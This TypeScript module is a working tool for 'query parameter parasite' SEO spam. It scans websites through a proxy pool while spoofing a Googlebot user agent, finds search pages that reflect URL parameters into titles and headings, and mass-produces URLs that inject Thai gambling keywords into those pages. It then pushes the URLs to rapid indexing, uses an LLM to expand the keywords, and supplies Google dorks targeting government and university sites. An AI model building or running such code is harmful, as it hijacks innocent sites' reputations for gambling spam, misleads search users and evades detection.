/**
 * Query Parameter Parasite Engine
 * 
 * Attack pattern: Find websites with search/query pages that reflect URL parameters
 * into title tags, headings, and page content. Inject gambling keywords via URL parameters
 * so Google indexes the pages with gambling content.
 * 
 * Example: https://www.naugachia.com/video/?query=ทดลองเล่นสล็อตpgซื้อฟรีสปิน
 * → Google sees title: "ทดลองเล่นสล็อตpgซื้อฟรีสปิน สมัครสล็อตเว็บตรง..."
 * 
 * This is a NON-DESTRUCTIVE parasite method — we don't modify the target site,
 * we just create URLs that Google will index with our keywords.
 */

import { invokeLLM } from "./_core/llm";
import { fetchWithPoolProxy } from "./proxy-pool";
import { rapidIndexBulk } from "./rapid-indexing-engine";
import { notifyOwner } from "./_core/notification";

// ═══════════════════════════════════════════════
//  TYPES
// ═══════════════════════════════════════════════

export interface QueryParasiteTarget {
  baseUrl: string;           // e.g., https://www.naugachia.com/video/
  paramName: string;         // e.g., "query", "q", "search", "s"
  reflectsInTitle: boolean;
  reflectsInH1: boolean;
  reflectsInContent: boolean;
  domain: string;
  domainAuthority?: number;
}

export interface QueryParasiteDeployment {
  targetUrl: string;         // Full URL with injected keyword
  keyword: string;
  injectedTitle?: string;
  indexed: boolean;
  deployedAt: number;
}

export interface QueryParasiteScanResult {
  domain: string;
  url: string;
  vulnerable: boolean;
  paramName?: string;
  reflections: {
    title: boolean;
    h1: boolean;
    content: boolean;
    meta: boolean;
  };
  error?: string;
}

export interface QueryParasiteCampaign {
  id: string;
  targets: QueryParasiteTarget[];
  deployments: QueryParasiteDeployment[];
  keywords: string[];
  startedAt: number;
  totalDeployed: number;
  totalIndexed: number;
}

// ═══════════════════════════════════════════════
//  COMMON SEARCH PARAMETERS TO TEST
// ═══════════════════════════════════════════════

const SEARCH_PARAMS = ["q", "query", "search", "s", "keyword", "term", "k", "text", "find", "w"];

const SEARCH_PATHS = [
  "/search", "/search.php", "/search.html",
  "/?s=", "/video/", "/results",
  "/tag/", "/category/",
  "/index.php?search=",
  "/wp/?s=",
];

// ═══════════════════════════════════════════════
//  SCAN: Find vulnerable search pages
// ═══════════════════════════════════════════════

/**
 * Scan a domain for search pages that reflect query parameters into title/content
 */
export async function scanForQueryReflection(domain: string): Promise<QueryParasiteScanResult[]> {
  const results: QueryParasiteScanResult[] = [];
  const testKeyword = "xyztest123gambling";

  for (const path of SEARCH_PATHS) {
    for (const param of SEARCH_PARAMS) {
      try {
        const baseUrl = `https://${domain}${path}`;
        const separator = path.includes("?") ? "&" : "?";
        const testUrl = `${baseUrl}${separator}${param}=${encodeURIComponent(testKeyword)}`;

        const { response: resp } = await fetchWithPoolProxy(testUrl, {
          method: "GET",
          headers: {
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Accept": "text/html",
            "Accept-Language": "th-TH,th;q=0.9",
          },
          redirect: "follow",
        });

        if (!resp.ok) continue;

        const html = await resp.text();
        if (!html || html.length < 100) continue;

        // Check reflections
        const titleMatch = html.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
        const h1Match = html.match(/<h1[^>]*>([\s\S]*?)<\/h1>/i);
        const metaMatch = html.match(/<meta[^>]*name=["']description["'][^>]*content=["']([\s\S]*?)["']/i);

        const reflections = {
          title: titleMatch ? titleMatch[1].includes(testKeyword) : false,
          h1: h1Match ? h1Match[1].includes(testKeyword) : false,
          content: html.includes(testKeyword),
          meta: metaMatch ? metaMatch[1].includes(testKeyword) : false,
        };

        const vulnerable = reflections.title || reflections.h1;

        if (vulnerable) {
          results.push({
            domain,
            url: baseUrl,
            vulnerable: true,
            paramName: param,
            reflections,
          });
        }
      } catch {
        // Skip failed attempts
      }
    }
  }

  return results;
}

// ═══════════════════════════════════════════════
//  DEPLOY: Create parasited URLs with gambling keywords
// ═══════════════════════════════════════════════

/**
 * Generate optimized gambling keyword URLs for a vulnerable target
 */
export async function deployQueryParasite(
  target: QueryParasiteTarget,
  keywords: string[],
  redirectUrl?: string,
): Promise<QueryParasiteDeployment[]> {
  const deployments: QueryParasiteDeployment[] = [];

  for (const keyword of keywords) {
    try {
      const separator = target.baseUrl.includes("?") ? "&" : "?";
      const parasiteUrl = `${target.baseUrl}${separator}${target.paramName}=${encodeURIComponent(keyword)}`;

      // Verify the URL actually reflects the keyword
      let injectedTitle: string | undefined;
      try {
        const { response: resp2 } = await fetchWithPoolProxy(parasiteUrl, {
          method: "GET",
          headers: {
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
            "Accept": "text/html",
          },
          redirect: "follow",
        });

        if (resp2.ok) {
          const html = await resp2.text();
          const titleMatch = html.match(/<title[^>]*>([\s\S]*?)<\/title>/i);
          if (titleMatch) {
            injectedTitle = titleMatch[1].trim();
          }
        }
      } catch {
        // Still deploy even if verification fails
      }

      deployments.push({
        targetUrl: parasiteUrl,
        keyword,
        injectedTitle,
        indexed: false,
        deployedAt: Date.now(),
      });
    } catch {
      // Skip failed keywords
    }
  }

  // Rapid index all deployed URLs
  if (deployments.length > 0) {
    try {
      const requests = deployments.map(d => ({
        url: d.targetUrl,
        domain: target.domain,
        keywords: [d.keyword],
        contentType: "parasite" as const,
        priority: "high" as const,
      }));
      await rapidIndexBulk(requests);
      for (const d of deployments) {
        d.indexed = true;
      }
    } catch (err) {
      console.error("[QueryParasite] Indexing failed:", (err as Error).message);
    }
  }

  return deployments;
}

// ═══════════════════════════════════════════════
//  AI: Generate optimized keyword variants
// ═══════════════════════════════════════════════

/**
 * Use AI to generate keyword variants optimized for search parameter injection
 */
export async function generateParasiteKeywords(
  baseKeywords: string[],
  niche: string = "gambling",
  language: string = "th",
  count: number = 20,
): Promise<string[]> {
  try {
    const resp = await invokeLLM({
      messages: [
        {
          role: "system",
          content: `You are an SEO keyword expert for Thai ${niche} websites. Generate keyword variants that are:
1. Short enough to fit in URL parameters (max 60 chars)
2. High search volume in Thailand
3. Include brand + generic combinations
4. Mix of exact match and long-tail
5. Include common Thai misspellings and variations
Return ONLY a JSON array of strings, no explanation.`,
        },
        {
          role: "user",
          content: `Generate ${count} Thai ${niche} keyword variants based on these seeds: ${baseKeywords.join(", ")}
Focus on keywords people actually search on Google Thailand.`,
        },
      ],
      response_format: {
        type: "json_schema",
        json_schema: {
          name: "keywords",
          strict: true,
          schema: {
            type: "object",
            properties: {
              keywords: {
                type: "array",
                items: { type: "string" },
              },
            },
            required: ["keywords"],
            additionalProperties: false,
          },
        },
      },
    });

    const content = resp.choices[0].message.content;
    const parsed = JSON.parse(typeof content === "string" ? content : "{}");
    return (parsed.keywords || []).slice(0, count);
  } catch {
    // Fallback to manual expansion
    return baseKeywords.flatMap(kw => [
      kw,
      `${kw} 2024`,
      `${kw} เว็บตรง`,
      `${kw} ฟรี`,
      `สมัคร${kw}`,
      `${kw} ไม่ผ่านเอเยนต์`,
    ]).slice(0, count);
  }
}

// ═══════════════════════════════════════════════
//  MASS SCAN: Find vulnerable sites from SERP
// ═══════════════════════════════════════════════

/**
 * Use Google dorks to find sites with reflective search pages
 */
export function getQueryParasiteDorks(): string[] {
  return [
    'inurl:"?q=" inurl:search site:.com',
    'inurl:"?query=" site:.org',
    'inurl:"?s=" inurl:search site:.edu',
    'inurl:"?search=" site:.gov',
    'inurl:"/search?q=" -google -bing -yahoo',
    'inurl:"/video/?query=" site:.com',
    'inurl:"?keyword=" site:.com',
    'inurl:"/results?q=" site:.org',
    'inurl:"/tag/" site:.com',
    'inurl:"?s=" wordpress',
    'inurl:"/search/" site:.in',
    'inurl:"/search/" site:.co.th',
    'inurl:"?q=" site:.ac.th',
    'inurl:"?search=" site:.go.th',
  ];
}

// ═══════════════════════════════════════════════
//  ORCHESTRATOR: Full campaign runner
// ═══════════════════════════════════════════════

/**
 * Run a full Query Parameter Parasite campaign
 * 1. Scan targets for vulnerable search pages
 * 2. Generate optimized keywords
 * 3. Deploy parasited URLs
 * 4. Submit for rapid indexing
 * 5. Report results
 */
export async function runQueryParasiteCampaign(config: {
  domains: string[];
  keywords: string[];
  niche?: string;
  language?: string;
  maxKeywordsPerTarget?: number;
  notifyTelegram?: boolean;
}): Promise<QueryParasiteCampaign> {
  const campaignId = `qp-${Date.now()}`;
  const campaign: QueryParasiteCampaign = {
    id: campaignId,
    targets: [],
    deployments: [],
    keywords: config.keywords,
    startedAt: Date.now(),
    totalDeployed: 0,
    totalIndexed: 0,
  };

  console.log(`[QueryParasite] Starting campaign ${campaignId} — ${config.domains.length} domains, ${config.keywords.length} keywords`);

  // Step 1: Generate expanded keywords
  const expandedKeywords = await generateParasiteKeywords(
    config.keywords,
    config.niche || "gambling",
    config.language || "th",
    config.maxKeywordsPerTarget || 20,
  );
  const keywordSet = new Set([...config.keywords, ...expandedKeywords]);
  campaign.keywords = Array.from(keywordSet);

  // Step 2: Scan all domains for vulnerable search pages
  for (const domain of config.domains) {
    try {
      const scanResults = await scanForQueryReflection(domain);
      for (const result of scanResults) {
        if (result.vulnerable && result.paramName) {
          campaign.targets.push({
            baseUrl: result.url,
            paramName: result.paramName,
            reflectsInTitle: result.reflections.title,
            reflectsInH1: result.reflections.h1,
            reflectsInContent: result.reflections.content,
            domain: result.domain,
          });
        }
      }
    } catch (err) {
      console.error(`[QueryParasite] Scan failed for ${domain}:`, (err as Error).message);
    }
  }

  console.log(`[QueryParasite] Found ${campaign.targets.length} vulnerable targets`);

  // Step 3: Deploy parasited URLs
  for (const target of campaign.targets) {
    try {
      const deployments = await deployQueryParasite(
        target,
        campaign.keywords.slice(0, config.maxKeywordsPerTarget || 20),
      );
      campaign.deployments.push(...deployments);
      campaign.totalDeployed += deployments.length;
      campaign.totalIndexed += deployments.filter(d => d.indexed).length;
    } catch (err) {
      console.error(`[QueryParasite] Deploy failed for ${target.domain}:`, (err as Error).message);
    }
  }

  // Step 4: Notify
  if (config.notifyTelegram && campaign.totalDeployed > 0) {
    try {
      await notifyOwner({
        title: `🔗 Query Parasite Campaign Complete`,
        content: [
          `Campaign: ${campaignId}`,
          `Targets scanned: ${config.domains.length}`,
          `Vulnerable found: ${campaign.targets.length}`,
          `URLs deployed: ${campaign.totalDeployed}`,
          `URLs indexed: ${campaign.totalIndexed}`,
          `Keywords: ${campaign.keywords.slice(0, 5).join(", ")}...`,
        ].join("\n"),
      });
    } catch {
      // Notification is optional
    }
  }

  console.log(`[QueryParasite] Campaign ${campaignId} complete — ${campaign.totalDeployed} deployed, ${campaign.totalIndexed} indexed`);

  return campaign;
}

// ═══════════════════════════════════════════════
//  TICK: Called by orchestrator periodically
// ═══════════════════════════════════════════════

/**
 * Orchestrator tick — find new vulnerable sites and deploy parasites
 */
export async function queryParasiteTick(
  keywords: string[],
  existingTargets?: string[],
): Promise<{
  scanned: number;
  vulnerable: number;
  deployed: number;
  indexed: number;
}> {
  const domains = existingTargets || [];
  
  // If no domains provided, use dorks to find some
  if (domains.length === 0) {
    // This would be called with domains from SERP harvester
    return { scanned: 0, vulnerable: 0, deployed: 0, indexed: 0 };
  }

  const campaign = await runQueryParasiteCampaign({
    domains,
    keywords,
    niche: "gambling",
    language: "th",
    maxKeywordsPerTarget: 15,
    notifyTelegram: true,
  });

  return {
    scanned: domains.length,
    vulnerable: campaign.targets.length,
    deployed: campaign.totalDeployed,
    indexed: campaign.totalIndexed,
  };
}
